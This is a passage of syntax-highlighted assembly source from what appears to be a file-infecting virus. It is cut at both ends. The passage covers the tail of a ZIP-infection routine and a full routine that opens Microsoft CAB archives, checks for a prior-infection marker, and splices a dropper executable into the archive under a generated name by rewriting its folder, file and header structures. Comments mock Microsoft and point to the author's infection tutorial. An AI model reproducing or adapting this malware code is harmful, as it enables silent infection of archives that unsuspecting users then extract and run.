        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">

    </span><span class="sc5">__iZIP_fClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">

    </span><span class="sc5">__iZIP_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ infection in CAB archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function infects Microsoft CAB archivez. The way  of</span><span class="sc0">
        </span><span class="sc1">;infection is the most difficult of all archivez here.Why?</span><span class="sc0">
        </span><span class="sc1">;Micro$hit CAB format is too stupid, I cannot compress  my</span><span class="sc0">
        </span><span class="sc1">;dropper because I don't know  any DLL which support this.</span><span class="sc0">
        </span><span class="sc1">;Although Windows has some Extrac32 and so on. If you want</span><span class="sc0">
        </span><span class="sc1">;to know more about CAB infection, download my tutorial on</span><span class="sc0">
        </span><span class="sc1">;web: http://prizzy.cjb.net (download section, of course).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    filename_ptr ... pointer to a CAB's file</span><span class="sc0">
        </span><span class="sc1">;        NewCAB.dropper . name of EXE</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__iCAB_fHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's handle</span><span class="sc0">
        </span><span class="sc5">__iCAB_fFSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's file size</span><span class="sc0">
        </span><span class="sc5">__iCAB_fMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's body+hdrs</span><span class="sc0">

        </span><span class="sc5">__iCAB_dHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's handle</span><span class="sc0">
        </span><span class="sc5">__iCAB_dFSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's file size</span><span class="sc0">

        </span><span class="sc5">__iCAB_nChars</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;chars of new name</span><span class="sc0">
        </span><span class="sc5">__iCAB_myFolder</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;my new folder</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_CAB</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; check whether dropper exists</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewCAB.dropper</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iCAB_finish</span><span class="sc0">

        </span><span class="sc1">; open archive file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iCAB_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; check whether archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_archive_infected</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iCAB_fClose</span><span class="sc0">

        </span><span class="sc1">; get archive file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fFSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; open dropper file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewCAB.dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iCAB_fClose</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get dropper's file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dFSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; generate dropper's name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CABf_FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; allocate memory for whole file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CABe_Compr_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read archive's headers to buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fFSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fHandle</span><span class="sc4">]</span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iCAB_dClose</span><span class="sc0">

        </span><span class="sc1">; check archive's header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'FCSM'</span><span class="sc0">        </span><span class="sc1">;"MSCF" signature ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iCAB_dClose</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_VersionMin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">),</span><span class="sc2">0103h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iCAB_dClose</span><span class="sc0">

        </span><span class="sc1">; get volume number - I want only 1st volume</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_Number</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">),</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iCAB_dClose</span><span class="sc0">

        </span><span class="sc1">; set ESI on the first entry</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CABh_FirstRec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; modify folder's starts</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CABh_nFolders</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">__iCAB_modify</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iCAB_modified</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABd_FirstRec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">),</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iCAB_modify</span><span class="sc0">
    </span><span class="sc5">__iCAB_modified</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; make place for new folder</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__movsd_back</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; save offset - ESI=place of the new folder</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_myFolder</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">;modify later</span><span class="sc0">

        </span><span class="sc1">; get number of files and calculate my new file position</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CABh_nFiles</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc1">; modify all file structs in CAB archive</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">__iCAB_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iCAB_searched</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CABf_FileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iCAB_search</span><span class="sc0">
    </span><span class="sc5">__iCAB_searched</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; update file in folder</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc4">(</span><span class="sc5">CABh_nFolders</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc1">; make place for new file struct</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;new file name length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__movsd_back</span><span class="sc0">

        </span><span class="sc1">; set some values to file header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dFSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;drropper's file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CABe_Compr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CABe_UnCompr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CABf_UnCompSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; save offset of the file struct</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CAB_file_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc4">(</span><span class="sc5">CABf_Flags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">),</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; modify files - ESI=next file struct</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;files to modify</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">__iCAB_search_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iCAB_searched_2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CABf_FileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iCAB_search_2</span><span class="sc0">
    </span><span class="sc5">__iCAB_searched_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; change CAB header</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \   </span><span class="sc1">;add new folder</span><span class="sc0">
            </span><span class="sc4">(</span><span class="sc5">CABh_nFolders</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \   </span><span class="sc1">;add new files</span><span class="sc0">
